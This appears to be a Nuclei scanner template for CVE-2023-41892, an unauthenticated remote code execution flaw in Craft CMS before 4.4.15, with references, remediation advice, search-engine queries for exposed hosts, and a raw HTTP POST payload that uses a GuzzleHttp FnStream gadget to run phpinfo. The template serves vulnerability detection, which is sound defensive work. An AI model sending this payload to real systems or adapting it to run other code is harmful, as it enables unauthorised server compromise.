id: CVE-2023-41892

info:
  name: CraftCMS < 4.4.15 - Unauthenticated Remote Code Execution
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  description: Craft CMS is a platform for creating digital experiences. This is a high-impact, low-complexity attack vector leading to Remote Code Execution (RCE). Users running Craft installations before 4.4.15 are encouraged to update to at least that version to mitigate the issue. This issue has been fixed in Craft CMS 4.4.15.
  remediation: |
    Apply the latest security patches and updates from the vendor to address this vulnerability.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the target system.
  reference:
    - https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
    - https://blog.calif.io/p/craftcms-rce
    - https://github.com/craftcms/cms/blob/develop/CHANGELOG.md#4415---2023-07-03-critical
    - https://github.com/craftcms/cms/commit/7359d18d46389ffac86c2af1e0cd59e37c298857
    - https://github.com/craftcms/cms/commit/a270b928f3d34ad3bd953b81c304424edd57355e
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-41892
    cwe-id: CWE-94
    epss-score: 0.93908
    epss-percentile: 0.99868
    cpe: cpe:2.3:a:craftcms:craft_cms:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: craftcms
    product: craft_cms
    shodan-query:
      - http.favicon.hash:-47932290
      - cpe:"cpe:2.3:a:craftcms:craft_cms"
      - http.html:craftcms
    fofa-query:
      - icon_hash=-47932290
      - body=craftcms
    publicwww-query: "craftcms"
  tags: cve2023,cve,rce,unauth,craftcms,vkev,vuln

http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}

    matchers:
      - type: word
        words:
          - "PHP Credits"
          - "PHP Group"
          - "CraftCMS"
        condition: and
        case-insensitive: true
# digest: 4a0a0047304502206401a6e2c3af48058eb0360affff223f23b480ab557941f16fbfbf3d0b11b329022100a1d1bdaee44a39f5c866c73c7c65f0ed0791ba4c2575f5cdf001ac231ffcfd8a:922c64590222798bb761d5b6d8e72950